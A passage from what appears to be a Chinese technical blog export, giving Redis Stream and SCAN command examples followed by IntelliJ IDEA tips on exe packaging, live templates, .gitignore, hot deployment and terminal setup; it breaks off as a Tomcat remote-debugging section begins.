<p>客户端成功处理了一条消息，之后应该调用<code>XACK</code>，这样该消息就不会再次被处理，同时，关于该消息的 <code>PEL</code>条目也会被清除，从而从Redis服务器释放内存。</p>
</li>
</ul>
<h3 id="span-id-STREAM-XPENDING-XPENDING-span"><span id="STREAM_XPENDING">XPENDING</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XPENDING</strong> key group [<font color="blue">[IDLE min-idle-time] start end count [consumer]</font>]</p>
</li>
<li>
<p>功能说明</p>
<p>从消费者组<code>PEL</code>中 返回获取了但从未确认的消息信息和条目</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">## 前期</span>
<span class="token operator">&gt;</span> XGROUP CREATE mystream mygroup $ MKSTREAM
<span class="token operator">&gt;</span> XADD mystream * message apple
<span class="token operator">&gt;</span> XADD mystream * message orange
<span class="token operator">&gt;</span> XADD mystream * message strawberry
<span class="token operator">&gt;</span> XADD mystream * message apricot
<span class="token operator">&gt;</span> XREADGROUP GROUP mygroup Alice COUNT <span class="token number">1</span> STREAMS mystream <span class="token operator">&gt;</span>


<span class="token comment">## 实验</span>
<span class="token operator">&gt;</span> XPENDING mystream mygroup 
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1675739360459-0"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"1675739360459-0"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"Alice"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1"</span>
<span class="token operator">&gt;</span> XACK mystream mygroup <span class="token number">1675739360459</span>-0
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>
<span class="token operator">&gt;</span> XPENDING mystream mygroup 
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h3 id="span-id-STREAM-XCLAIM-XCLAIM-span"><span id="STREAM_XCLAIM"> XCLAIM</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XCLAIM</strong>  key group consumer  min-idle-time  id [id …]  [<strong>IDLE</strong> ms]<br>
[<strong>TIME</strong> unix-time-milliseconds] [<strong>RETRYCOUNT</strong> count] [<strong>FORCE</strong>] [<strong>JUSTID</strong>]<br>
[<strong>LASTID</strong> id]</p>
</li>
<li>
<p>功能说明</p>
<p>此命令用于更改待处理消息的 所有权。通常情况是这样的</p>
<ol>
<li><code>STREAM</code> 存在关联消费者组 <code>group_a</code></li>
<li>某个<code>consumer_a </code>在<code>group_a</code>的上下文中通过 <code>XREADGROUP</code> 从流中读取消息。</li>
<li>在<code>group_a</code>的待处理条目列表 (PEL) 中创建了一个待处理的消息条目：这意味着消息已传递给<code>consumer_a </code>，但尚未通过<code> XACK</code> 确认</li>
<li>然后突然之间，<code>consumer_a </code>永远地失败了</li>
<li>其他消费者可能会使用<code>XPENDING</code>命令检查挂起的消息列表，这些消息已经过期很长时间了。为了继续处理此类消息，它们使用XCLAIM获取消息的所有权并继续。使用者还可以使用<code>XAUTOCLAIM</code>命令自动扫描和声明过期的待处理消息。</li>
</ol>
<p>XCLAIM在以下情况下不会声明消息</p>
<ol>
<li>消息在组PEL中不存在(即它从未被任何消费者读取)</li>
<li>消息存在于组PEL中，但不存在于流本身(即消息被读取但从未被确认，然后通过修剪或XDEL从流中删除)</li>
</ol>
</li>
<li>
<p>命令参数</p>
<p>该命令有多个选项，但大多数主要用于内部使用，以便将<code>XCLAIM</code>或其他命令的效果传输到AOF文件中，并将相同的效果传播到副本中。</p>
<ol>
<li>
<p><strong>IDLE <ms></ms></strong>: 设置消息的空闲时间(最后一次发送)。如果没有指定IDLE，则假设IDLE为0，也就是说，时间计数将被重置，因为消息现在有一个新的所有者试图处理它。</p>
</li>
<li>
<p><strong>TIME <ms-unix-time></ms-unix-time></strong>: 这与IDLE相同，但不是相对的毫秒数，它将空闲时间设置为特定的Unix时间(以毫秒为单位)。这对于重写生成<code>XCLAIM</code>命令的AOF文件非常有用。</p>
</li>
<li>
<p><strong>RETRYCOUNT <count></count></strong>: 设置重试次数为指定值。每当再次传递消息时，此计数器都会增加。通常XCLAIM不会改变这个计数器，它只在调用<code>XPENDING</code>命令时提供给客户端:这样客户端就可以检测到异常情况，比如在尝试大量传递后由于某种原因从未处理过的消息。</p>
</li>
<li>
<p><strong>FORCE</strong>: 在PEL中创建挂起的消息条目，即使某些指定的id还没有在分配给不同客户端的PEL中。但是消息必须在流中存在，否则不存在的消息id将被忽略。</p>
</li>
<li>
<p><strong>JUSTID</strong>:  只返回成功声明的消息的id数组，而不返回实际的消息。使用此选项意味着重试计数器不增加。</p>
</li>
</ol>
</li>
<li>
<p>使用举例：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> XPENDING mystream mygroup 
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nil<span class="token punctuation">)</span>

<span class="token operator">&gt;</span> XREADGROUP GROUP mygroup Alice COUNT <span class="token number">1</span> STREAMS mystream <span class="token operator">&gt;</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"mystream"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1675739360699-0"</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"message"</span>
            <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"apricot"</span>
<span class="token operator">&gt;</span> XPENDING mystream mygroup 
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1675739360699-0"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"1675739360699-0"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"Alice"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1"</span> 

<span class="token operator">&gt;</span> XCLAIM mystream mygroup Bob <span class="token number">300</span> <span class="token number">1675739360699</span>-0
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1675739360699-0"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"message"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"apricot"</span>

 
<span class="token comment">## 使用 XCLAIM 之后 1675739360699-0 的消费者由 Alice 变更为 Bob</span>
<span class="token operator">&gt;</span> XPENDING mystream mygroup 
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1675739360699-0"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"1675739360699-0"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"Bob"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h3 id="span-id-STREAM-XAUTOCLAIM-XAUTOCLAIM-span"><span id="STREAM_XAUTOCLAIM">XAUTOCLAIM </span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XAUTOCLAIM</strong> key group consumer  min-idle-time  start [<strong>COUNT</strong> count]<br>
[<strong>JUSTID</strong>]</p>
</li>
<li>
<p>功能说明</p>
<p>从概念上讲，XAUTOCLAIM 等同于调用XPENDING，然后调用XCLAIM</p>
</li>
</ul>
<h1>基础命令：<span id="Order_SCAN">SCAN</span></h1>
<ul>
<li>
<p>命令详情</p>
<p><strong>SCAN</strong> cursor [<strong>MATCH</strong> pattern] [<strong>COUNT</strong> count] [<strong>TYPE</strong> type]</p>
</li>
<li>
<p>命令参数解释</p>
<p>cursor ：开始迭代时的光标值为 0 / 上一次调用 SCAN 返回的光标以继续迭代</p>
<p><strong>TYPE</strong> type：您可以使用 TYPE 选项要求 SCAN 仅返回与给定类型匹配的对象，从而允许您遍历数据库以查找特定类型的键。TYPE 选项仅在整个数据库 SCAN 上可用，而不是 HSCAN 或 ZSCAN 等。</p>
</li>
<li>
<p>使用DEMO</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> sadd myset <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> foo foobar feelsgood
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">6</span>
redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> sscan myset <span class="token number">0</span> match f*
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"0"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"foo"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"feelsgood"</span>
   <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"foobar"</span>
redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>重要的是要注意<strong>MATCH</strong>过滤器是在从集合中检索到元素之后应用的，就在将数据返回给客户端之前。</p>
<p>这意味着如果模式匹配集合中的极少元素，<code>SCAN</code>则在大多数迭代中可能不会返回任何元素。一个例子如下所示：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> scan <span class="token number">0</span> MATCH *11*
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"288"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"key:911"</span>
redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> scan <span class="token number">288</span> MATCH *11*
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"224"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>empty list or <span class="token builtin class-name">set</span><span class="token punctuation">)</span>
redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> scan <span class="token number">224</span> MATCH *11*
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"80"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>empty list or <span class="token builtin class-name">set</span><span class="token punctuation">)</span>
redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> scan <span class="token number">80</span> MATCH *11*
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"176"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>empty list or <span class="token builtin class-name">set</span><span class="token punctuation">)</span>
redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> scan <span class="token number">176</span> MATCH *11* COUNT <span class="token number">1000</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"0"</span>
<span class="token number">2</span><span class="token punctuation">)</span>  <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"key:611"</span>
    <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"key:711"</span>
    <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"key:118"</span>
    <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"key:117"</span>
    <span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"key:311"</span>
    <span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"key:112"</span>
    <span class="token number">7</span><span class="token punctuation">)</span> <span class="token string">"key:111"</span>
    <span class="token number">8</span><span class="token punctuation">)</span> <span class="token string">"key:110"</span>
    <span class="token number">9</span><span class="token punctuation">)</span> <span class="token string">"key:113"</span>
   <span class="token number">10</span><span class="token punctuation">)</span> <span class="token string">"key:211"</span>
   <span class="token number">11</span><span class="token punctuation">)</span> <span class="token string">"key:411"</span>
   <span class="token number">12</span><span class="token punctuation">)</span> <span class="token string">"key:115"</span>
   <span class="token number">13</span><span class="token punctuation">)</span> <span class="token string">"key:116"</span>
   <span class="token number">14</span><span class="token punctuation">)</span> <span class="token string">"key:114"</span>
   <span class="token number">15</span><span class="token punctuation">)</span> <span class="token string">"key:119"</span>
   <span class="token number">16</span><span class="token punctuation">)</span> <span class="token string">"key:811"</span>
   <span class="token number">17</span><span class="token punctuation">)</span> <span class="token string">"key:511"</span>
   <span class="token number">18</span><span class="token punctuation">)</span> <span class="token string">"key:11"</span>
redis <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如您所见，大多数调用返回零元素，但最后一次调用使用 COUNT 为 1000 以强制命令对该迭代进行更多扫描</p>
</li>
</ul>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA 使用技巧</title>
    <url>/20221026/2241d802.html</url>
    <content><![CDATA[<p>[Toc]</p>
<h1>IDEA：Java项目打包成exe文件</h1>
<p>来源：<a href="https://blog.csdn.net/zmq836010/article/details/124257340">https://blog.csdn.net/zmq836010/article/details/124257340</a></p>
<h2 id="将Java项目打包成Jar包">将Java项目打包成Jar包</h2>
<ol>
<li>
<p>打开Idea，点击File》Project Settings</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_13,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
</li>
<li>
<p>Main Class：选择你项目的main函数所在的类。点击OK</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_11,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt=" "></p>
<ol start="3">
<li>选中Build，点击Build Project，再点击Build Artifacts，点击回车键，即可。</li>
<li>在项目的out\artifacts\Demo_jar目录下，生成了一个Jar文件（可以将Jar文件复制到桌面，方便接下来操作）</li>
</ol>
</li>
</ol>
<h2 id="下载并安装exe4j-exe文件，将Jar包转成exe可执行文件">下载并安装exe4j.exe文件，将Jar包转成exe可执行文件</h2>
<ol>
<li>
<p>启动exe4j，点击Next，后选择“JAR in EXE” mode</p>
</li>
<li>
<p>点击Next，Output directory 可以选择桌面，选择你想要保存的exe文件的目录</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16-1684724432885-111.png" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_15,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
</li>
<li>
<p>点击Next</p>
</li>
</ol>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_15,color_FFFFFF,t_70,g_se,x_16-1684724474981-116.png" alt="img"></p>
<ol start="4">
<li>
<p>点击绿色的加号</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16-1684724512104-119.png" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_15,color_FFFFFF,t_70,g_se,x_16-1684724525195-122.png" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16-1684724534909-125.png" alt="img"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5YaZ5Luj56CB6LWa6ZKx5Lmw5YyF5YyF,size_16,color_FFFFFF,t_70,g_se,x_16-1684724552612-128.png" alt="img"></p>
<p>点击Next（后面直接点next，不用配置，最后就会生成exe文件）</p>
</li>
</ol>
<h1>IDEA添加自定义模板方法</h1>
<ol>
<li>
<p>首先，点击File–&gt;Settings–&gt;Editor–&gt;Live Templates</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230339392-1678440029358-27.png" alt="image-20211127230339392"></p>
</li>
<li>
<p>接着，点击右上角“+”添加“Template Group”模板组，如Java</p>
</li>
</ol>
<p>​        ​<img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230357335-1678440029363-33-1684719815381-36.png" alt="image-20211127230357335"></p>
<ol start="3">
<li>
<p>在新增的模板组内添加模板，点击右上角“+”添加“Live Template”</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230437624-1678441147652-124-1684719815381-38.png" alt="image-20211127230437624"></p>
</li>
<li>
<p>填写模板内容，定义出发快捷键选择 Enter</p>
</li>
</ol>
<p>​        <img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230500953-1678440029363-35-1684719815381-34.png" alt="image-20211127230500953"></p>
<ol start="5">
<li>
<p>定义作用域</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230524523-1678441147652-126-1684719815381-32.png" alt="image-20211127230524523"></p>
<p>这样就OK了，可以仿照这种方式，自定义很多快捷输入的语句，比如输入，输出等：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211127230606315-1678441147653-128-1684719815381-40.png" alt="image-20211127230606315"></p>
</li>
</ol>
<h1>IDEA 针对Terminal更新环境变量</h1>
<ol>
<li>修改shell path 调用的程序</li>
</ol>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230522093839928.png" alt="image-20230522093839928"></p>
<ol start="2">
<li>Git 环境变量</li>
</ol>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230522094033065.png" alt="image-20230522094033065"></p>
<ol start="3">
<li>在IDEA中的命令行终端中输入<strong>bash</strong> 即可调用<strong>git bash</strong> ，使用结束后输入<strong>exit</strong>退出</li>
</ol>
<h1>IDEA 开启RunDashboard</h1>
<p>修改 .idea/workspace.xml 文件</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-163802692934114-1678440286408-97-1684409715194-1.png" alt="b8b40c372c3114cb88d98abdc1621768.png"></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">找到<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>component</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>RunDashboard<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 添加配置：


<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>configurationTypes<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>set</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SpringBootApplicationConfigurationType<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>set</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最终配置：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image004-1678440286408-99-1684409715194-3.png" alt="c8e483b781cfd443e68a15b94345844b.png"><br>
显示效果：</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image005-1678440286408-101-1684409715194-5.png" alt="511e587a5be1655e22f23d7981c2b8c8.png"></p>
<h1>IDEA 配置Git忽略提交文件</h1>
<ol>
<li>
<p>点击<strong>File-&gt;Settings-&gt;Plugins</strong>，点击Browse repositories…</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-163802704819915-1678440995166-112.png" alt="3b2f62bb2f51c955400f9d9ff9945a6e.png"></p>
</li>
<li>
<p>搜索**.ignore**，点击<strong>Install</strong>，安装完成后，重启IDEA</p>
</li>
<li>
<p>在 项目上 右键-&gt;New -&gt;.ignore file -&gt;.gitignore file(Git)</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image004-163802704820016.png" alt="bdd020c028cf2b207232d1c58ac45f66.png"></p>
</li>
<li>
<p>先选择Example user template好了，以后有什么想过滤的可以自行添加，~最后点击Generate生成</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image006-1678440995166-116.png" alt="3e4705d5b72a8e3944b7e70d4f967e89.png"></p>
</li>
<li>
<p>然后就会发现被忽略的文件名变成了灰色</p>
</li>
<li>
<p>也可以右键文件将其加入忽略的名单中</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image008-1678440995166-118.png" alt="89c2f940c462b9558a9158f433a6e13b.png"></p>
</li>
<li>
<p>以下是一些.gitignore文件忽略的匹配规则：</p>
<table>
<thead>
<tr>
<th>通配符</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>.a</td>
<td>忽略所有 .a 结尾的文件</td>
</tr>
<tr>
<td>!lib.a</td>
<td>但 lib.a 除外</td>
</tr>
<tr>
<td>/TODO</td>
<td>仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODO</td>
</tr>
<tr>
<td>build/</td>
<td>忽略 build/ 目录下的所有文件</td>
</tr>
<tr>
<td>doc/.txt</td>
<td>会忽略 doc/notes.txt 但不包括 doc/server/arch.txt</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>注意</p>
<p>.gitignore只能忽略那些原来没有被track的文件，如果某些文件已经被纳入了版本管理中，则修改.gitignore是无效的。<br>
那么解决方法就是先把本地缓存删除（改变成未track状态），然后再提交：</p>
 <pre class="line-numbers language-none"><code class="language-none">输入：
git rm -r –cached filePath
git commit -m “remove xx”

或者：
git rm -r –cached .
git add .
git commit -m “update .gitignore”


来解释下几个参数
-r 是删除文件夹及其子目录
–cached 是删除暂存区里的文件而不删除工作区里的文件，

第一种是删除某个文件，第二种方法就把所有暂存区里的文件删了，再加一遍，相当于更新了一遍。
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>IDEA 配置SpringBoot热部署</h1>
<ul>
<li>
<p>导入devtools依赖即可</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-devtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>然后到<code>setting</code>框中，输入<code>compiler</code>，然后勾选**<code>Build project automatically</code>**</p>
</li>
<li>
<p>然后按住<strong>shift+alt+ctrl+/</strong>，进入**<code>maintenance</code><strong>,然后选择进入</strong>Registry**</p>
</li>
<li>
<p>勾选**<code>compiler.automake.when.app.running</code>**</p>
</li>
</ul>
<h1>IDEA 针对Terminal更新环境变量</h1>
<blockquote>
<p>目的： Terminal 终端直接使用GitBash，IDEA默认使用的是<code>cmd</code></p>
</blockquote>
<p>打开Terminal 的Settings， 可以看到 默认的shell path</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230310184202752-1684410325349-13.png" alt="image-20230310184202752"></p>
<h2 id="方法一：修改默认的schell-path">方法一：修改默认的schell path</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230310184346589-1684410325349-15.png" alt="image-20230310184346589"></p>
<h2 id="方法二：将git的bash-exe配置到操作系统环境变量path中">方法二：将git的bash.exe配置到操作系统环境变量path中</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230310184700388.png" alt=" "></p>
<p>此时，在Terminal中 输入 <code>bash</code>  直接打开 git bash</p>
<h1>远程调试 TOMCAT</h1>
<h2 id="TOMCAT服务器配置">TOMCAT服务器配置</h2>
<ul>
<li>
<p>方式一：官方推荐</p>
<p>在<code>catalina.sh</code>文件的文件头加上如下配置项即可。其中<code>address=8000</code>的端口号8000 自定义</p>
